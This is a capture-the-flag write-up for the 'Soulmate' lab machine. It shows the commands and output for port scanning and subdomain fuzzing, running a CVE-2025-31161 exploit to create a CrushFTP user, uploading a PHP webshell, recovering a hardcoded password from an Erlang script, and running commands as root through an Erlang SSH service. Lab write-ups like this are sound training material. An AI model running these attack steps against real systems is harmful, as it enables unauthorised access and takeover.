# Writeup: Soulmate

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Mon Dec  1 02:24:21 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.129.44.10
Nmap scan report for 10.129.44.10
Host is up, received user-set (0.053s latency).
Scanned at 2025-12-01 02:24:21 EST for 39s
Not shown: 65430 closed tcp ports (reset), 103 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec  1 02:25:00 2025 -- 1 IP address (1 host up) scanned in 39.39 seconds
```

On port 80 i found a nginx webserver running, so i have done a directory bruteforce with `gobuster` which gives me some stuff to inspect.

```shell
gobuster dir -u http://soulmate.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 40 -x php -o gobuster_scan
```

```
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 8554]
/register.php         (Status: 200) [Size: 11107]
/assets               (Status: 301) [Size: 178] [--> http://soulmate.htb/assets/]
/profile.php          (Status: 302) [Size: 0] [--> /login]
/index.php            (Status: 200) [Size: 16688]
/dashboard.php        (Status: 302) [Size: 0] [--> /login]
/index.php            (Status: 200) [Size: 16688]
/.                    (Status: 200) [Size: 16688]
```

Since the nmap scan shows that the server tries to redirect to `http://soulmate.htb` i have fuzzed for subdomains with `fuff`.

```shell
ffuf -u http://soulmate.htb -H 'Host: FUZZ.soulmate.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -ic -c -fs 154
```

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
:: Progress: [100000/100000] :: Job [1/1] :: 985 req/sec :: Duration: [0:02:15] :: Errors: 0 ::
```

On `http://ftp.soulmate.htb` i found a `CrushFTP` running, so i checked it for known exploits and found [CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161).

## 💥 Exploitation:

I used `CVE-2025-31161` to create a new user and login to the `CrushFTP` application.

```
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user dw0rsec --password 12345678

[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: dw0rsec
   [*] Password: 12345678.
```

After login to the aplication i was able to change the password of the user `ben` under the `User Manager` and relog as `ben`. Logged in as `ben` i was able to upload a php webshell under `http://ftp.soulmate.htb/#/webProd/`. After opening `http://soulmate.htb/shell.php` i got a shell back as user `www-data`.

I have checked the usual things for privesc (sudo -l; cronjobs, linpeas, etc.) but did not find anything so i uploaded `pspy64` which reveals this interessting command.

```
/usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5
/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /u
sr/local/lib/erlang_login/start.escript
```

By inspecting the file i found the password for the user `ben`, which is `HouseH0ldi******`. After login as user `ben` i was able to read the `user.txt` inside of his home directory.

```shell
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldi******"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

## 🔓 Priviledge Escalation:

By checking for open ports on the target machine with `ss -tulpne` i found erlang ssh service running.

```
...
tcp     LISTEN   0         5                127.0.0.1:2222             0.0.0.0:*       ino:23514 sk:1006 cgroup:/system.slice/erlang_ssh.service <->
...
```

I used `ssh ben@127.0.0.1 -p 2222` to login to the erlang ssh service and was able to read the `root.txt` with this cammand `(ssh_runner@soulmate)4> os:cmd("cat /root/root.txt").`

## 💰 Loot:

```shell
# user.txt
f952b1ed9ca01a40291465**********

# root.txt
ec5e9f447054d481d35210**********
```